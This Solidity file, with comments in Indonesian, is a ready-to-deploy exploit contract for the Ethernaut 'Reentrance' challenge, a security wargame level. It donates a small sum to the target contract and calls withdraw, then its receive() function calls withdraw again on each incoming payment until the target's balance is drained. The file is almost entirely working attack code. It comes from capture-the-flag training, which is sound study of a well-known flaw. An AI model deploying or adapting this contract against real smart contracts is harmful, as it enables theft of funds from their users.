// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// Kita definisikan fungsi-fungsi milik target yang mau kita panggil
interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract Attack {
    IReentrance public target;
    uint256 initialDeposit;

    // Masukkan alamat Ethernaut Level saat deploy
    constructor(address _targetAddr) public {
        target = IReentrance(_targetAddr);
    }

    // 1. Panggil fungsi ini untuk mulai menyerang
    // Jangan lupa isi Value (misal 0.001 ETH) saat memanggil ini
    function startAttack() public payable {
        initialDeposit = msg.value;
        
        // Langkah A: Donasi dulu biar kita punya saldo di sana
        target.donate{value: initialDeposit}(address(this));
        
        // Langkah B: Minta tarik kembali saldo tersebut
        // Ini akan memicu fungsi receive() di bawah
        target.withdraw(initialDeposit);
    }

    // 2. Ini adalah 'Mulut' yang berteriak minta uang lagi
    // Jalan otomatis saat target mengirim ETH
    receive() external payable {
        // Cek sisa uang di brankas target
        uint256 targetBalance = address(target).balance;
        
        if (targetBalance > 0) {
            // Tentukan berapa mau ditarik (jangan lebih dari sisa uang target)
            uint256 amountToWithdraw = initialDeposit;
            if (targetBalance < initialDeposit) {
                amountToWithdraw = targetBalance;
            }
            
            // SERANGAN: Panggil withdraw lagi!
            target.withdraw(amountToWithdraw);
        }
    }
}